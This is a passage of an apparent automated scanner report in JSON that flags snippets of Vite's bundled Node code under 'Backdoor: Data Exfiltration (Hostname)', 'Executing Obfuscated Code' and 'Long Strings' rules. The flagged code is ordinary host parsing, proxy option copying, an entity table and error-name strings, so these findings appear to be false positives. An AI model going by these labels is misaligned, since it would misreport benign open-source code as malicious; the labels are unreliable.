            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 60149,
                  "startColumn": 3,
                  "endLine": 60149,
                  "endColumn": 11,
                  "snippet": {
                    "text": "var preservedUrlFields = [\n  \"auth\",\n  \"host\",\n  \"hostname\",\n  \"href\",\n  \"path\",\n  \"pathname\",\n",
                    "rendered": {
                      "text": "var preservedUrlFields = [\n  \"auth\",\n  \"host\",\n  \"hostname\",\n  \"href\",\n  \"path\",\n  \"pathname\",\n",
                      "markdown": "`var preservedUrlFields = [\n  \"auth\",\n  \"host\",\n  \"hostname\",\n  \"href\",\n  \"path\",\n  \"pathname\",\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 59749,
                  "startColumn": 13,
                  "endLine": 59749,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\t  outgoing.port = options[forward || 'target'].port ||\n\t                  (isSSL.test(options[forward || 'target'].protocol) ? 443 : 80);\n\n\t  ['host', 'hostname', 'socketPath', 'pfx', 'key',\n\t    'passphrase', 'cert', 'ca', 'ciphers', 'secureProtocol'].forEach(\n\t    function(e) { outgoing[e] = options[forward || 'target'][e]; }\n\t  );\n",
                    "rendered": {
                      "text": "\t  outgoing.port = options[forward || 'target'].port ||\n\t                  (isSSL.test(options[forward || 'target'].protocol) ? 443 : 80);\n\n\t  ['host', 'hostname', 'socketPath', 'pfx', 'key',\n\t    'passphrase', 'cert', 'ca', 'ciphers', 'secureProtocol'].forEach(\n\t    function(e) { outgoing[e] = options[forward || 'target'][e]; }\n\t  );\n",
                      "markdown": "`\t  outgoing.port = options[forward || 'target'].port ||\n\t                  (isSSL.test(options[forward || 'target'].protocol) ? 443 : 80);\n\n\t  ['host', 'hostname', 'socketPath', 'pfx', 'key',\n\t    'passphrase', 'cert', 'ca', 'ciphers', 'secureProtocol'].forEach(\n\t    function(e) { outgoing[e] = options[forward || 'target'][e]; }\n\t  );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57826,
                  "startColumn": 16,
                  "endLine": 57826,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n    ...opts.headers,\n    'Sec-WebSocket-Version': opts.protocolVersion,\n",
                    "rendered": {
                      "text": "  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n    ...opts.headers,\n    'Sec-WebSocket-Version': opts.protocolVersion,\n",
                      "markdown": "`  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n    ...opts.headers,\n    'Sec-WebSocket-Version': opts.protocolVersion,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57825,
                  "startColumn": 16,
                  "endLine": 57825,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  opts.defaultPort = opts.defaultPort || defaultPort;\n  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n    ...opts.headers,\n",
                    "rendered": {
                      "text": "  opts.defaultPort = opts.defaultPort || defaultPort;\n  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n    ...opts.headers,\n",
                      "markdown": "`  opts.defaultPort = opts.defaultPort || defaultPort;\n  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n    ...opts.headers,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57824,
                  "startColumn": 24,
                  "endLine": 57824,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    opts.createConnection || (isSecure ? tlsConnect : netConnect);\n  opts.defaultPort = opts.defaultPort || defaultPort;\n  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n",
                    "rendered": {
                      "text": "    opts.createConnection || (isSecure ? tlsConnect : netConnect);\n  opts.defaultPort = opts.defaultPort || defaultPort;\n  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n",
                      "markdown": "`    opts.createConnection || (isSecure ? tlsConnect : netConnect);\n  opts.defaultPort = opts.defaultPort || defaultPort;\n  opts.port = parsedUrl.port || defaultPort;\n  opts.host = parsedUrl.hostname.startsWith('[')\n    ? parsedUrl.hostname.slice(1, -1)\n    : parsedUrl.hostname;\n  opts.headers = {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57751,
                  "startColumn": 4,
                  "endLine": 57751,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    maxRedirects: 10,\n    ...options,\n    socketPath: undefined,\n    hostname: undefined,\n    protocol: undefined,\n    timeout: undefined,\n    method: 'GET',\n",
                    "rendered": {
                      "text": "    maxRedirects: 10,\n    ...options,\n    socketPath: undefined,\n    hostname: undefined,\n    protocol: undefined,\n    timeout: undefined,\n    method: 'GET',\n",
                      "markdown": "`    maxRedirects: 10,\n    ...options,\n    socketPath: undefined,\n    hostname: undefined,\n    protocol: undefined,\n    timeout: undefined,\n    method: 'GET',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17357,
                  "startColumn": 53,
                  "endLine": 17357,
                  "endColumn": 61,
                  "snippet": {
                    "text": "      (detail) => detail && detail.address && (detail.family === \"IPv4\" || // @ts-expect-error Node 18.0 - 18.3 returns number\n      detail.family === 4)\n    ).forEach((detail) => {\n      let host = detail.address.replace(\"127.0.0.1\", hostname.name);\n      if (host.includes(\":\")) {\n        host = `[${host}]`;\n      }\n",
                    "rendered": {
                      "text": "      (detail) => detail && detail.address && (detail.family === \"IPv4\" || // @ts-expect-error Node 18.0 - 18.3 returns number\n      detail.family === 4)\n    ).forEach((detail) => {\n      let host = detail.address.replace(\"127.0.0.1\", hostname.name);\n      if (host.includes(\":\")) {\n        host = `[${host}]`;\n      }\n",
                      "markdown": "`      (detail) => detail && detail.address && (detail.family === \"IPv4\" || // @ts-expect-error Node 18.0 - 18.3 returns number\n      detail.family === 4)\n    ).forEach((detail) => {\n      let host = detail.address.replace(\"127.0.0.1\", hostname.name);\n      if (host.includes(\":\")) {\n        host = `[${host}]`;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17347,
                  "startColumn": 26,
                  "endLine": 17347,
                  "endColumn": 34,
                  "snippet": {
                    "text": "      hostnameName = `[${hostnameName}]`;\n    }\n    const address2 = `${protocol}://${hostnameName}:${port}${base}`;\n    if (loopbackHosts.has(hostname.host)) {\n      local.push(address2);\n    } else {\n      network.push(address2);\n",
                    "rendered": {
                      "text": "      hostnameName = `[${hostnameName}]`;\n    }\n    const address2 = `${protocol}://${hostnameName}:${port}${base}`;\n    if (loopbackHosts.has(hostname.host)) {\n      local.push(address2);\n    } else {\n      network.push(address2);\n",
                      "markdown": "`      hostnameName = `[${hostnameName}]`;\n    }\n    const address2 = `${protocol}://${hostnameName}:${port}${base}`;\n    if (loopbackHosts.has(hostname.host)) {\n      local.push(address2);\n    } else {\n      network.push(address2);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17342,
                  "startColumn": 23,
                  "endLine": 17342,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n    }\n",
                    "rendered": {
                      "text": "  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n    }\n",
                      "markdown": "`  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17341,
                  "startColumn": 53,
                  "endLine": 17341,
                  "endColumn": 61,
                  "snippet": {
                    "text": "  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n",
                    "rendered": {
                      "text": "  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n",
                      "markdown": "`  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17341,
                  "startColumn": 6,
                  "endLine": 17341,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n",
                    "rendered": {
                      "text": "  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n",
                      "markdown": "`  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n  if (hostname.host !== void 0 && !wildcardHosts.has(hostname.host)) {\n    let hostnameName = hostname.name;\n    if (hostnameName.includes(\":\")) {\n      hostnameName = `[${hostnameName}]`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17337,
                  "startColumn": 8,
                  "endLine": 17337,
                  "endColumn": 16,
                  "snippet": {
                    "text": "  }\n  const local = [];\n  const network = [];\n  const hostname = await resolveHostname(options.host);\n  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n",
                    "rendered": {
                      "text": "  }\n  const local = [];\n  const network = [];\n  const hostname = await resolveHostname(options.host);\n  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n",
                      "markdown": "`  }\n  const local = [];\n  const network = [];\n  const hostname = await resolveHostname(options.host);\n  const protocol = options.https ? \"https\" : \"http\";\n  const port = address.port;\n  const base = config.rawBase === \"./\" || config.rawBase === \"\" ? \"/\" : config.rawBase;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 359,
                  "startColumn": 352,
                  "endLine": 359,
                  "endColumn": 396,
                  "snippet": {
                    "text": "de\\u07a2\\u07d6\\u080f\\u0a4a\\u0a91\\u0da1\\u0e6d\\u0f09\\u0f26\\u10ca\\u1228\\u12e1\\u1415\\u149d\\u14c3\\u14df\\u1525\\0\\0\\0\\0\\0\\0\\u156b\\u16cd\\u198d\\u1c12\\u1ddd\\u1f7e\\u2060\\u21b0\\u228d\\u23c0\\u23fb\\u2442\\u2824\\u2912\\u2d08\\u2e48\\u2fce\\u3016\\u32ba\\u3639\\u37ac\\u38fe\\u3a28\\u3a71\\u3ae0\\u3b2e\\u0800EMabcfglmnoprstu\\\\bfms\\x7f\\x84\\x8b\\x90\\x95\\x98\\xa6\\xb3\\xb9\\xc8\\xcflig\\u803b\\xc6\\u40c6P\\u803b&\\u4026cute\\u803b\\xc1\\u40c1reve;\\u4102\\u0100iyx}rc\\u803b\\xc2\\u40c2;\\u4410r;\\uc000\\ud835\\udd04rave\\u803b\\xc0\\u40c0pha;\\u4391acr;\\u4100d;\\u6a53\\u0100gp\\x9d\\xa1on;\\u4104f;\\uc000\\ud835\\udd38plyFunction;\\u6061ing\\u803b\\xc5\\u40c5\\u0100cs\\xbe\\xc3r;\\uc000\\ud835\\udc9cign;\\u6254ilde\\",
                    "rendered": {
                      "text": "de\\u07a2\\u07d6\\u080f\\u0a4a\\u0a91\\u0da1\\u0e6d\\u0f09\\u0f26\\u10ca\\u1228\\u12e1\\u1415\\u149d\\u14c3\\u14df\\u1525\\0\\0\\0\\0\\0\\0\\u156b\\u16cd\\u198d\\u1c12\\u1ddd\\u1f7e\\u2060\\u21b0\\u228d\\u23c0\\u23fb\\u2442\\u2824\\u2912\\u2d08\\u2e48\\u2fce\\u3016\\u32ba\\u3639\\u37ac\\u38fe\\u3a28\\u3a71\\u3ae0\\u3b2e\\u0800EMabcfglmnoprstu\\\\bfms\\x7f\\x84\\x8b\\x90\\x95\\x98\\xa6\\xb3\\xb9\\xc8\\xcflig\\u803b\\xc6\\u40c6P\\u803b&\\u4026cute\\u803b\\xc1\\u40c1reve;\\u4102\\u0100iyx}rc\\u803b\\xc2\\u40c2;\\u4410r;\\uc000\\ud835\\udd04rave\\u803b\\xc0\\u40c0pha;\\u4391acr;\\u4100d;\\u6a53\\u0100gp\\x9d\\xa1on;\\u4104f;\\uc000\\ud835\\udd38plyFunction;\\u6061ing\\u803b\\xc5\\u40c5\\u0100cs\\xbe\\xc3r;\\uc000\\ud835\\udc9cign;\\u6254ilde\\",
                      "markdown": "`de\\u07a2\\u07d6\\u080f\\u0a4a\\u0a91\\u0da1\\u0e6d\\u0f09\\u0f26\\u10ca\\u1228\\u12e1\\u1415\\u149d\\u14c3\\u14df\\u1525\\0\\0\\0\\0\\0\\0\\u156b\\u16cd\\u198d\\u1c12\\u1ddd\\u1f7e\\u2060\\u21b0\\u228d\\u23c0\\u23fb\\u2442\\u2824\\u2912\\u2d08\\u2e48\\u2fce\\u3016\\u32ba\\u3639\\u37ac\\u38fe\\u3a28\\u3a71\\u3ae0\\u3b2e\\u0800EMabcfglmnoprstu\\\\bfms\\x7f\\x84\\x8b\\x90\\x95\\x98\\xa6\\xb3\\xb9\\xc8\\xcflig\\u803b\\xc6\\u40c6P\\u803b&\\u4026cute\\u803b\\xc1\\u40c1reve;\\u4102\\u0100iyx}rc\\u803b\\xc2\\u40c2;\\u4410r;\\uc000\\ud835\\udd04rave\\u803b\\xc0\\u40c0pha;\\u4391acr;\\u4100d;\\u6a53\\u0100gp\\x9d\\xa1on;\\u4104f;\\uc000\\ud835\\udd38plyFunction;\\u6061ing\\u803b\\xc5\\u40c5\\u0100cs\\xbe\\xc3r;\\uc000\\ud835\\udc9cign;\\u6254ilde\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 127,
                  "startColumn": 8,
                  "endLine": 127,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    ERR[\"noncharacterCharacterReference\"] = \"noncharacter-character-reference\";\n    ERR[\"missingWhitespaceBeforeDoctypeName\"] = \"missing-whitespace-before-doctype-name\";\n    ERR[\"missingDoctypeName\"] = \"missing-doctype-name\";\n    ERR[\"invalidCharacterSequenceAfterDoctypeName\"] = \"invalid-character-sequence-after-doctype-name\";\n    ERR[\"duplicateAttribute\"] = \"duplicate-attribute\";\n    ERR[\"nonConformingDoctype\"] = \"non-conforming-doctype\";\n    ERR[\"missingDoctype\"] = \"missing-doctype\";\n",
                    "rendered": {
                      "text": "    ERR[\"noncharacterCharacterReference\"] = \"noncharacter-character-reference\";\n    ERR[\"missingWhitespaceBeforeDoctypeName\"] = \"missing-whitespace-before-doctype-name\";\n    ERR[\"missingDoctypeName\"] = \"missing-doctype-name\";\n    ERR[\"invalidCharacterSequenceAfterDoctypeName\"] = \"invalid-character-sequence-after-doctype-name\";\n    ERR[\"duplicateAttribute\"] = \"duplicate-attribute\";\n    ERR[\"nonConformingDoctype\"] = \"non-conforming-doctype\";\n    ERR[\"missingDoctype\"] = \"missing-doctype\";\n",
                      "markdown": "`    ERR[\"noncharacterCharacterReference\"] = \"noncharacter-character-reference\";\n    ERR[\"missingWhitespaceBeforeDoctypeName\"] = \"missing-whitespace-before-doctype-name\";\n    ERR[\"missingDoctypeName\"] = \"missing-doctype-name\";\n    ERR[\"invalidCharacterSequenceAfterDoctypeName\"] = \"invalid-character-sequence-after-doctype-name\";\n    ERR[\"duplicateAttribute\"] = \"duplicate-attribute\";\n    ERR[\"nonConformingDoctype\"] = \"non-conforming-doctype\";\n    ERR[\"missingDoctype\"] = \"missing-doctype\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 8,
                  "endLine": 119,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    ERR[\"eofInComment\"] = \"eof-in-comment\";\n    ERR[\"incorrectlyClosedComment\"] = \"incorrectly-closed-comment\";\n    ERR[\"eofInCdata\"] = \"eof-in-cdata\";\n    ERR[\"absenceOfDigitsInNumericCharacterReference\"] = \"absence-of-digits-in-numeric-character-reference\";\n    ERR[\"nullCharacterReference\"] = \"null-character-reference\";\n    ERR[\"surrogateCharacterReference\"] = \"surrogate-character-reference\";\n    ERR[\"characterReferenceOutsideUnicodeRange\"] = \"character-reference-outside-unicode-range\";\n",
                    "rendered": {
                      "text": "    ERR[\"eofInComment\"] = \"eof-in-comment\";\n    ERR[\"incorrectlyClosedComment\"] = \"incorrectly-closed-comment\";\n    ERR[\"eofInCdata\"] = \"eof-in-cdata\";\n    ERR[\"absenceOfDigitsInNumericCharacterReference\"] = \"absence-of-digits-in-numeric-character-reference\";\n    ERR[\"nullCharacterReference\"] = \"null-character-reference\";\n    ERR[\"surrogateCharacterReference\"] = \"surrogate-character-reference\";\n    ERR[\"characterReferenceOutsideUnicodeRange\"] = \"character-reference-outside-unicode-range\";\n",
                      "markdown": "`    ERR[\"eofInComment\"] = \"eof-in-comment\";\n    ERR[\"incorrectlyClosedComment\"] = \"incorrectly-closed-comment\";\n    ERR[\"eofInCdata\"] = \"eof-in-cdata\";\n    ERR[\"absenceOfDigitsInNumericCharacterReference\"] = \"absence-of-digits-in-numeric-character-reference\";\n    ERR[\"nullCharacterReference\"] = \"null-character-reference\";\n    ERR[\"surrogateCharacterReference\"] = \"surrogate-character-reference\";\n    ERR[\"characterReferenceOutsideUnicodeRange\"] = \"character-reference-outside-unicode-range\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 8,
                  "endLine": 105,
                  "endColumn": 51,
                  "snippet": {
                    "text": "tifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdentifier\"] = \"missing-doctype-public-identifier\";\n    ERR[\"missingDoctypeSystemIdentifier\"] = \"missing-doctype-system-identifier\";\n    ERR[\"abruptDoctypePublicIdentifier\"] = \"abrupt-doctype-public-identifier\";\n    E",
                    "rendered": {
                      "text": "tifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdentifier\"] = \"missing-doctype-public-identifier\";\n    ERR[\"missingDoctypeSystemIdentifier\"] = \"missing-doctype-system-identifier\";\n    ERR[\"abruptDoctypePublicIdentifier\"] = \"abrupt-doctype-public-identifier\";\n    E",
                      "markdown": "`tifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdentifier\"] = \"missing-doctype-public-identifier\";\n    ERR[\"missingDoctypeSystemIdentifier\"] = \"missing-doctype-system-identifier\";\n    ERR[\"abruptDoctypePublicIdentifier\"] = \"abrupt-doctype-public-identifier\";\n    E`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 104,
                  "startColumn": 8,
                  "endLine": 104,
                  "endColumn": 51,
                  "snippet": {
